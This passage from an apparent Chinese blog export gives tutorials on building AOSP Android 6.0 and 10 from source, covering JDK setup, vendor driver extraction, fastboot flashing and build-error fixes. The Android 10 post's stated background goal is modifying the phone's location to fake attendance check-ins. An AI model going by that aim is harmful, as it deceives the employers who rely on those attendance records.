class=\"comment\">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span></span><br><span class=\"line\"># deb-src https:<span class=\"comment\">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span></span><br></pre></td></tr></table></figure>\n\n<p>ubuntu镜像</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">deb http:<span class=\"comment\">//cn.archive.ubuntu.com/ubuntu/ groovy main universe restricted multiverse</span></span><br><span class=\"line\">deb-src http:<span class=\"comment\">//cn.archive.ubuntu.com/ubuntu/ groovy main universe restricted multiverse #Added by software-properties</span></span><br><span class=\"line\">deb http:<span class=\"comment\">//security.ubuntu.com/ubuntu/ groovy-security main universe restricted multiverse</span></span><br><span class=\"line\">deb-src http:<span class=\"comment\">//cn.archive.ubuntu.com/ubuntu/ groovy-security main universe restricted multiverse #Added by software-properties</span></span><br><span class=\"line\">deb http:<span class=\"comment\">//cn.archive.ubuntu.com/ubuntu/ groovy-updates main universe restricted multiverse</span></span><br><span class=\"line\">deb-src http:<span class=\"comment\">//cn.archive.ubuntu.com/ubuntu/ groovy-updates main universe restricted multiverse #Added by software-properties</span></span><br></pre></td></tr></table></figure>\n\n<p>然后我们需要将apt install更新一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># apt-get update</span><br></pre></td></tr></table></figure>\n\n<p>然后我们需要向ubuntu的镜像里面添加openjdk7 的仓库，开始下载：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo add-apt-repository ppa:openjdk-r/ppa</span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install openjdk-<span class=\"number\">7</span>-jdk</span><br></pre></td></tr></table></figure>\n\n<p>这样就可以将openjdk7下载完成，但是这里好像并不适用，所以我在这里直接给出我找到的压缩包，大家解压一些就可以了</p>\n<h5 id=\"lt-2-gt-压缩包解压\"><a href=\"#lt-2-gt-压缩包解压\" class=\"headerlink\" title=\"&lt;2&gt; 压缩包解压\"></a>&lt;2&gt; 压缩包解压</h5><p>我们将压缩包直接解压，压缩包见附件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">tar -zxvf jdk-7u80-linux-i586.tar.gz</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/14.png\" alt=\"image-20210927093209306\"></p>\n<p>配置环境变量：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo gedit /etc/profile</span><br><span class=\"line\">在文件最后添加环境变量</span><br><span class=\"line\">export JAVA_HOME=/home/tom/bin/java-se-7u75-ri</span><br><span class=\"line\">export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class=\"line\">export PATH=$PATH:$JAVA_HOME/bin</span><br></pre></td></tr></table></figure>\n\n<p>激活环境变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">source /etc/profile</span><br></pre></td></tr></table></figure>\n\n<p>检测jdk版本</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/15.png\" alt=\"image-20210927093720491\"></p>\n<p>这样我们的jdk环境就配置完成，当然我们为了方便后续多版本切换，我们还可以设置jdk版本切换</p>\n<h4 id=\"（3）JDK版本切换\"><a href=\"#（3）JDK版本切换\" class=\"headerlink\" title=\"（3）JDK版本切换\"></a>（3）JDK版本切换</h4><h5 id=\"lt-1-gt-设置序列号\"><a href=\"#lt-1-gt-设置序列号\" class=\"headerlink\" title=\"&lt;1&gt;设置序列号\"></a>&lt;1&gt;设置序列号</h5><p>我们需要使用update-alternatives设置序列号方便我们选择</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># update-alternatives  --install  /usr/bin/java  java  /home/tom/bin/java-se-7u75-ri/bin/java  <span class=\"number\">3</span></span><br><span class=\"line\"># update-alternatives  --install  /usr/bin/javac  javac  /home/tom/bin/java-se-7u75-ri/bin/javac  <span class=\"number\">3</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-2-gt-切换设置jdk版本\"><a href=\"#lt-2-gt-切换设置jdk版本\" class=\"headerlink\" title=\"&lt;2&gt;切换设置jdk版本\"></a>&lt;2&gt;切换设置jdk版本</h5><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># update-alternatives  --config  java</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/16.png\" alt=\"image-20210927093720491\"></p>\n<p>我们选择对于的版本序号</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/17.png\" alt=\"image-20210927094633711\"></p>\n<p>然后我们再次验证版本：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/18.png\" alt=\"image-20210927094633711\"></p>\n<p>我们可以同样的配置javac，这样我们就可以完成jdk的版本切换了</p>\n<h5 id=\"lt-3-gt-删除设置版本\"><a href=\"#lt-3-gt-删除设置版本\" class=\"headerlink\" title=\"&lt;3&gt;删除设置版本\"></a>&lt;3&gt;删除设置版本</h5><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">update-alternatives –remove java /home/tom/bin/java-se-7u75-ri/bin/java</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（4）常见错误\"><a href=\"#（4）常见错误\" class=\"headerlink\" title=\"（4）常见错误\"></a>（4）常见错误</h4><p>下面主要介绍jdk配置引起的错误：</p>\n<h5 id=\"lt-1-gt-错误1\"><a href=\"#lt-1-gt-错误1\" class=\"headerlink\" title=\"&lt;1&gt;错误1\"></a>&lt;1&gt;错误1</h5><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/19.png\" alt=\"image-20210927094918651\"></p>\n<p>原因分析：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）这可能是仓库中没有openjdk引起</span><br><span class=\"line\">（2）这可能是没有更新apt的下载源</span><br></pre></td></tr></table></figure>\n\n<p>解决办法：</p>\n<p>切换镜像源，然后更新 apt-get update，详细可以参考上文常见方法中镜像源的设置</p>\n<h5 id=\"lt-2-gt-错误2\"><a href=\"#lt-2-gt-错误2\" class=\"headerlink\" title=\"&lt;2&gt;错误2\"></a>&lt;2&gt;错误2</h5><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/20.png\" alt=\"image-20210927094918651\"></p>\n<p>原因分析：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）使用java版本选择工具可能无法识别到jdk1<span class=\"number\">.7</span></span><br><span class=\"line\">（<span class=\"number\">2</span>）进行make会提示jdk1<span class=\"number\">.7</span>是不能识别的openJDK1<span class=\"number\">.7</span>，这里主要是makefile里的正则表达式判断失误，所以需要修改makefile</span><br></pre></td></tr></table></figure>\n\n<p>解决办法：</p>\n<p>1.修改安卓源码目录下的&#x2F;build&#x2F;envsetup.sh</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo gedit build/envsetup.sh</span><br><span class=\"line\">直接搜索set_java_home</span><br><span class=\"line\">然后将三处地方修改成我们的路径</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/21.png\" alt=\"image-20210927094918651\"></p>\n<p>2.注释版本检测的终止语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 编辑主make文件</span><br><span class=\"line\">sudo gedit build/core/main.mk</span><br><span class=\"line\"># 注释掉第 171 行的终止命令</span><br><span class=\"line\"># $(error stop)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/22.png\" alt=\"image-20210927094918651\"></p>\n<p>保存后按照正常的编译命令进行make就可以了</p>\n<h5 id=\"lt-3-gt-错误3\"><a href=\"#lt-3-gt-错误3\" class=\"headerlink\" title=\"&lt;3&gt;错误3\"></a>&lt;3&gt;错误3</h5><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/23.png\" alt=\"image-20210927094918651\"></p>\n<p>原因分析：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">经过检查原来是我们javac环境没有切换，我们将javac环境切换，然后重新编译</span><br></pre></td></tr></table></figure>\n\n<p>解决办法：</p>\n<p>配置javac</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/24.png\" alt=\"image-20210927094918651\"></p>\n<h5 id=\"lt-4-gt-错误4\"><a href=\"#lt-4-gt-错误4\" class=\"headerlink\" title=\"&lt;4&gt;错误4\"></a>&lt;4&gt;错误4</h5><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/25.png\" alt=\"image-20210927094918651\"></p>\n<p>原因分析：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">这是由于javadoc没有配置导致的</span><br></pre></td></tr></table></figure>\n\n<p>问题解决：</p>\n<p>配置javadoc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># update-alternatives  --install  /usr/bin/javadoc  javadoc  /home/tom/bin/java-se-7u75-ri/bin/javadoc  <span class=\"number\">3</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-环境配置\"><a href=\"#2-环境配置\" class=\"headerlink\" title=\"2.环境配置\"></a>2.环境配置</h3><h4 id=\"（1）源码准备\"><a href=\"#（1）源码准备\" class=\"headerlink\" title=\"（1）源码准备\"></a>（1）源码准备</h4><p>我们可以通过使用repo来从官方的镜像来下载Android源码，但是这样需要的时间较长，这里我们直接提供了各个版本系统源码的压缩包，大家直接导入后，进行解压即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">解压命令：tar -zxvf android-6.0.1_r1</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/1.png\" alt=\"image-20210926204554020\"></p>\n<h4 id=\"（2）配置驱动文件\"><a href=\"#（2）配置驱动文件\" class=\"headerlink\" title=\"（2）配置驱动文件\"></a>（2）配置驱动文件</h4><p>我们需要下载对应设备的驱动文件，这里我们使用的是Google nexus5，我们可以去<a href=\"https://developers.google.com/android/drivers#hammerheadktu84p\">官方网址</a>下载：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/2.png\" alt=\"image-20210926204554020\"></p>\n<p>我们可以看到这里的设备驱动型号很多，我们可以根据我们的设备型号去选择对应的设备驱动，这里我们就将这三个设备驱动下载并放入我们的源码下</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/3.png\" alt=\"image-20210926204554020\"></p>\n<p>然后我们依次的运行驱动文件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">sh extract-broadcom-hammerhead.sh</span><br></pre></td></tr></table></figure>\n\n<p>按Enter键一行行的查看，经过实验，当不停的确认到了8条后e结束，需要我们输入<code>I ACCEPT</code>，这样就解压到了vendor 目录下，其他两个脚本同样这样执行</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/4.png\" alt=\"image-20210926204554020\"></p>\n<p>三个文件解压后的目录：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/5.png\" alt=\"image-20210926204554020\"></p>\n<h4 id=\"（3）初始化编译环境\"><a href=\"#（3）初始化编译环境\" class=\"headerlink\" title=\"（3）初始化编译环境\"></a>（3）初始化编译环境</h4><h5 id=\"lt-1-gt-修改源码\"><a href=\"#lt-1-gt-修改源码\" class=\"headerlink\" title=\"&lt;1&gt;修改源码\"></a>&lt;1&gt;修改源码</h5><p>首先我们需要修改源码，修改源码文件中：<code>art/build/Android.common_build.mk</code>里的内容</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/26.png\" alt=\"image-20210927100604203\"></p>\n<p>不然容易报错：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/27.png\" alt=\"image-20210927100604203\"></p>\n<p>原因分析：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">修改的目的是把 CLANG 这个编译选项关掉，这个错误只会在 Ubuntu16<span class=\"number\">.04</span> 上遇到，Ubuntu14<span class=\"number\">.04</span> 则不存在这个问题</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-2-gt-设置高速缓存\"><a href=\"#lt-2-gt-设置高速缓存\" class=\"headerlink\" title=\"&lt;2&gt;设置高速缓存\"></a>&lt;2&gt;设置高速缓存</h5><p>我们在编译源码之前为了提高编译的速率：</p>\n<p>在 .bashrc文件末尾添加：export USE_CCACHE &#x3D; 1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">echo export USE_CCACHE=1 &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>\n\n<p>为了提高编译效率，设置编译器高速缓存:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">prebuilts/misc/linux-x86/ccache/ccache -M 50G</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-3-gt-清空输出和初始化环境\"><a href=\"#lt-3-gt-清空输出和初始化环境\" class=\"headerlink\" title=\"&lt;3&gt;清空输出和初始化环境\"></a>&lt;3&gt;清空输出和初始化环境</h5><p>我们可以在开始编译之前清楚之前所有编译操作的输出，避免出现错误，首次编译不需要：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">make clobber</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/6.png\" alt=\"image-20210926204554020\"></p>\n<p>然后使用build目录中的envsetup.sh脚本初始化环境：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">source build/envsetup.sh 或 . build/envsetup.sh</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/7.png\" alt=\"image-20210926204554020\"></p>\n<h4 id=\"（4）选择编译目标\"><a href=\"#（4）选择编译目标\" class=\"headerlink\" title=\"（4）选择编译目标\"></a>（4）选择编译目标</h4><p>我们选择编译的具体目标，也就是指我们是将我们的源码编译到虚拟机还是具体的手机上运行，这里我们可以先看官方给的<a href=\"https://source.android.com/source/running\">型号图</a>：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/8.png\" alt=\"image-20210926210739483\"></p>\n<p>我们输入指令：<code>lunch</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/9.png\" alt=\"image-20210926213243118\"></p>\n<p>参考官方解释：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/10.png\" alt=\"image-20210926211110079\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/11.png\" alt=\"image-20210926212512938\"></p>\n<p>我们可以理解为：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">user---------&gt;最终用户机</span><br><span class=\"line\">userdebug----&gt;调试测试机</span><br><span class=\"line\">eng----------&gt;工程机</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（5）编译代码\"><a href=\"#（5）编译代码\" class=\"headerlink\" title=\"（5）编译代码\"></a>（5）编译代码</h4><p>这里我们开始编译源码，执行make -j4，4为同时编译的线程数，大家可以根据自己的设备情况选择</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">make -j4</span><br></pre></td></tr></table></figure>\n\n<p>查看cpu核心个数命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat  /proc/cpuinfo</span><br></pre></td></tr></table></figure>\n\n<p>编译结束，经过了漫长的过程，我们总算可以看见我们编译成功</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/28.png\" alt=\"image-20210926213243118\"></p>\n<p>我们进入输出的目录文件夹下：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/29.png\" alt=\"image-20210926213243118\"></p>\n<p>Android镜像结构分析详细可以见（8）</p>\n<h4 id=\"（7）编写刷机脚本\"><a href=\"#（7）编写刷机脚本\" class=\"headerlink\" title=\"（7）编写刷机脚本\"></a>（7）编写刷机脚本</h4><p>我们将手机进入bootloader模式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb reboot bootloader </span><br></pre></td></tr></table></figure>\n\n<p>手机如果没有解锁，我们需要解锁</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">fastboot oem unlock</span><br></pre></td></tr></table></figure>\n\n<p>我们将选中镜像导出，并刷入手机，编写刷机脚本，windows上文件后缀.bat，linux上文件后缀.sh</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">fastboot flash boot boot.img</span><br><span class=\"line\">fastboot flash system system.img</span><br><span class=\"line\">fastboot flash cache cache.img</span><br><span class=\"line\">fastboot flash userdata userdata.img</span><br><span class=\"line\">fastboot reboot</span><br></pre></td></tr></table></figure>\n\n<p>然后我们启动刷机脚本，就可以看见手机正常的刷入</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/30.png\" alt=\"image-20210926213243118\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/35.png\" alt=\"image-20210926213243118\"></p>\n<h4 id=\"（8）Android主要镜像解析\"><a href=\"#（8）Android主要镜像解析\" class=\"headerlink\" title=\"（8）Android主要镜像解析\"></a>（8）Android主要镜像解析</h4><p>刷机包目录：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/34.png\" alt=\"image-20210927105814789\"></p>\n<p>主要镜像：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/31.png\" alt=\"image-20210927104439801\"></p>\n<p>详细参考博客：<a href=\"https://blog.csdn.net/wutianyin222/article/details/7854375?utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-3.searchformbaiduhighlight&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-3.searchformbaiduhighlight\">android 主要镜像（image）解析</a></p>\n<h4 id=\"（9）常见错误\"><a href=\"#（9）常见错误\" class=\"headerlink\" title=\"（9）常见错误\"></a>（9）常见错误</h4><h5 id=\"lt-1-gt-错误1-1\"><a href=\"#lt-1-gt-错误1-1\" class=\"headerlink\" title=\"&lt;1&gt;错误1\"></a>&lt;1&gt;错误1</h5><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/32.png\" alt=\"image-20210927104439801\"></p>\n<p>类似错误：make:Nothing to be done for ‘all_modules’ 或 make:***No rule to make target Android.mk Stop等</p>\n<p>解决办法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）进入目录：/out/target/common/obj/JAVA_LIBRARIES，删除services_intermediates这个文件夹</span><br><span class=\"line\">（<span class=\"number\">1</span>）进入目录：/out/target/product/XXX/obj/JAVA_LIBRARIES，删除services_intermediates这个文件夹</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-2-gt-错误2-1\"><a href=\"#lt-2-gt-错误2-1\" class=\"headerlink\" title=\"&lt;2&gt;错误2\"></a>&lt;2&gt;错误2</h5><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/33.png\" alt=\"image-20210927104439801\"></p>\n<p>问题分析：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">这个错误的好像是由于在make一个任务时，并没有结束，这时在进行make就会报</span><br></pre></td></tr></table></figure>\n\n<p>我们使用命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">make clobber</span><br></pre></td></tr></table></figure>\n\n<p>make clobber的功能是把上一次make命令生成的文件或目录清除掉，效果比make clean更严格</p>\n<h2 id=\"四、实验总结\"><a href=\"#四、实验总结\" class=\"headerlink\" title=\"四、实验总结\"></a>四、实验总结</h2><p>本文详细记录了从Android6.0源码下载到Android源码编译的详细过程，其中参考了看雪上面的两位大佬帖子和网络上的一些博客，中间遇到了很多问题，并逐一解决，这里将所有的错误情况总结并放在了错误区，大家可以详细的对照，通过源码编译的过程，对Android系统的理解更加的深入了，接下来便开始进行Xposed源码的编译和定制，本文有什么问题就请大佬们指正了。</p>\n<p>这里给大家提供android版本的源码和OpenJDK7的下载包，大家也可以去github上免费下载，后续都会上传到github上：<a href=\"https://github.com/guoxuaa/Android-reverse\">github网址</a></p>\n<h2 id=\"五、参考文献\"><a href=\"#五、参考文献\" class=\"headerlink\" title=\"五、参考文献\"></a>五、参考文献</h2><p>JDK环境配置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）https://blog.csdn.net/u014709812/article/details/114584639?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1.searchformbaiduhighlight&amp;spm=1001.2101.3001.4242</span><br><span class=\"line\">（2）https://blog.csdn.net/xiangzi10/article/details/95730747</span><br><span class=\"line\">（3）https://forum.xda-developers.com/t/q-kitkat-hammerhead-aosp-compilation-errors.2736673/</span><br><span class=\"line\">（4）https://blog.csdn.net/qq_42824983/article/details/110236257</span><br></pre></td></tr></table></figure>\n\n<p>Android源码下载:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）https://bbs.pediy.com/thread-264521.htm</span><br><span class=\"line\">（2）https://www.cnblogs.com/coffee520/p/9639417.html</span><br><span class=\"line\">（3）https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/</span><br><span class=\"line\">（4）https://source.android.com/source/downloading</span><br></pre></td></tr></table></figure>\n\n<p>Android源码编译：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）https://bbs.pediy.com/thread-218513.htm</span><br><span class=\"line\">（2）https://blog.csdn.net/pengtgimust/article/details/90758507</span><br><span class=\"line\">（3）https://blog.csdn.net/fuchaosz/article/details/51487585</span><br><span class=\"line\">（4）https://juejin.cn/post/6844904191693946887</span><br><span class=\"line\">（5）https://blog.csdn.net/u012417380/article/details/72843185</span><br><span class=\"line\">（6）https://www.cxyzjd.com/article/xjkelwh/103045055</span><br><span class=\"line\">（7）https://blog.csdn.net/cnliwy/article/details/52189349</span><br><span class=\"line\">（8）https://blog.csdn.net/warticles/article/details/81063377</span><br></pre></td></tr></table></figure>\n\n","categories":["Android源码定制"],"tags":["逆向技术","源码定制"]},{"title":"Android源码定制（2）——Android10.0的编译流程","url":"/2022/12/04/code2/","content":"<h2 id=\"一、背景\"><a href=\"#一、背景\" class=\"headerlink\" title=\"一、背景\"></a>一、背景</h2><p>已经在AOSP 7.1.1 nexus 5x上面实现了修改位置打卡，现在是想在pixel3中继续尝试。</p>\n<p>作者：会飞的笨猫</p>\n<span id=\"more\"></span>\n\n<h2 id=\"二、如何选择代码\"><a href=\"#二、如何选择代码\" class=\"headerlink\" title=\"二、如何选择代码\"></a>二、如何选择代码</h2><p>要选择有对应驱动版本的代码分支，如果没有标明，强行用其他版本的驱动来编译刷机不知道是否可行。</p>\n<p>比如我选择的情况是这样的。</p>\n<p><a href=\"https://developers.google.com/android/drivers#bluelinepd1a.180720.030\">https://developers.google.com/android/drivers#bluelinepd1a.180720.030</a></p>\n<p><a href=\"https://source.android.com/docs/setup/about/build-numbers?hl=zh-cn\">https://source.android.com/docs/setup/about/build-numbers?hl=zh-cn</a></p>\n<p>这里是查代码分支和驱动版本的网站。</p>\n<p><img src=\"https://images.sunofbeaches.com/content/2022_11_22/1044707043673374720.jpg\" alt=\"图片描述\"></p>\n<p>为什么呢？因为我的网盘中的Android10代码有这个分支，如果通过repo的方式下载，我网络太差了，容易失败，相信很多人放弃都会卡在这一步，下个代码都下不了。</p>\n<p>我们之间下载某个分支的代码就行了，前提是这个分支刚好有驱动。</p>\n<p>复制代号：QQ3A.200805.001</p>\n<p>去驱动的网页上面搜索：</p>\n<p><img src=\"https://images.sunofbeaches.com/content/2022_11_22/1044707834823966720.jpg\" alt=\"图片描述\"></p>\n<p>在这里找到你的手机和对应代号的驱动。</p>\n<p>android-10.0.0_r41 -&gt; QQ3A.200805.001 &gt; Pixel 3 binaries for Android 10.0.0 (QQ3A.200805.001)</p>\n<p>关联起来，点击下载那2个文件就行了，先保存起来，到时候参与编译的。</p>\n<p>代码地址：链接: <a href=\"https://pan.baidu.com/s/1-U_53CtqMAb0ZsuEn_zLMQ\">https://pan.baidu.com/s/1-U_53CtqMAb0ZsuEn_zLMQ</a> 提取码: ktut</p>\n<p>下载好驱动，代码。</p>\n<h2 id=\"三、编译环境\"><a href=\"#三、编译环境\" class=\"headerlink\" title=\"三、编译环境\"></a>三、编译环境</h2><p>Ubuntu 1804</p>\n<p>安装好openjdk8</p>\n<p>和下面一堆东西。</p>\n<p>如果安装不了，请切换国内的源，快很多。（怎么切源，自己处理）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">sudo apt-get install -y libx11-dev:i386 libreadline6-dev:i386 libgl1-mesa-dev g++-multilib </span><br><span class=\"line\">sudo apt-get install -y git flex bison gperf build-essential libncurses5-dev:i386 </span><br><span class=\"line\">sudo apt-get install -y tofrodos python-markdown libxml2-utils xsltproc zlib1g-dev:i386 </span><br><span class=\"line\">sudo apt-get install -y dpkg-dev libsdl1.2-dev libesd0-dev</span><br><span class=\"line\">sudo apt-get install -y git-core gnupg flex bison gperf build-essential </span><br><span class=\"line\">sudo apt-get install -y zip curl zlib1g-dev gcc-multilib g++-multilib </span><br><span class=\"line\">sudo apt-get install -y libc6-dev-i386 </span><br><span class=\"line\">sudo apt-get install -y lib32ncurses5-dev x11proto-core-dev libx11-dev </span><br><span class=\"line\">sudo apt-get install -y libgl1-mesa-dev libxml2-utils xsltproc unzip m4</span><br><span class=\"line\">sudo apt-get install -y lib32z1-dev ccache</span><br><span class=\"line\">sudo apt-get install -y bc python flex bison gperf libsdl-dev libesd0-dev build-essential zip curl</span><br><span class=\"line\">sudo apt-get install -y libssl-dev liblz4-tool</span><br><span class=\"line\">sudo apt-get install -y libesd-java libwxgtk3.0-dev squashfs-tools pngcrush schedtool libxml2</span><br><span class=\"line\">sudo apt-get install -y lzop schedtool lib32readline-dev libswitch-perl libssl-dev</span><br></pre></td></tr></table></figure>\n\n<p>创建虚拟机的时候硬盘如果空间足够，尽量给多点比如300g，我给了虚拟机200g。</p>\n<p>编译好之后我的虚拟机可用空间剩余20g了。</p>\n<p>虚拟机内存至少16g。如果编译过程中遇到oom，内存不够，可以关机了加点，编译的进度会保留的。</p>\n<h2 id=\"四、准备编译\"><a href=\"#四、准备编译\" class=\"headerlink\" title=\"四、准备编译\"></a>四、准备编译</h2><p>进入源码根目录，解压驱动。</p>\n<p>用7z解压驱动包得到sh，如果安装7z，自己解决。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">tar zxvf google_devices-blueline-qq.3a.200805.001-466a3cb1.tgz</span><br><span class=\"line\"></span><br><span class=\"line\">tar zxvf qcom-blueline-200805.001-a5511ad3.tgz</span><br><span class=\"line\"></span><br><span class=\"line\">解压后得到2个sh文件</span><br><span class=\"line\"></span><br><span class=\"line\">extract-开头的。</span><br></pre></td></tr></table></figure>\n\n<p>执行sh文件</p>\n<p>.&#x2F;extract-</p>\n<p>情况和<a href=\"http://www.debuglive.cn/article/1036000920720113664%E6%96%87%E7%AB%A0%E7%B1%BB%E4%BC%BC%EF%BC%8C%E9%83%BD%E6%98%AF%E6%8C%89%E7%A9%BA%E6%A0%BC%E7%BB%A7%E7%BB%AD%EF%BC%8C%E6%9C%80%E5%90%8E%E8%A6%81%E6%89%8B%E5%8A%A8%E8%BE%93%E5%85%A5I\">http://www.debuglive.cn/article/1036000920720113664文章类似，都是按空格继续，最后要手动输入I</a> ACCEPT。两个文件都是一样的流程。</p>\n<p>如果开始编译的时候遇到这样的错误</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">find vendor: permission denied</span><br></pre></td></tr></table></figure>\n\n<p>给驱动文件夹权限。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">sudo chmod -R 777 vendor</span><br></pre></td></tr></table></figure>\n\n<p>到此开始编译。</p>\n<p>源码根目录输入：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">source build/envsetup.sh</span><br><span class=\"line\"></span><br><span class=\"line\">回车</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">lunch</span><br><span class=\"line\"></span><br><span class=\"line\">回车</span><br></pre></td></tr></table></figure>\n\n<p><img 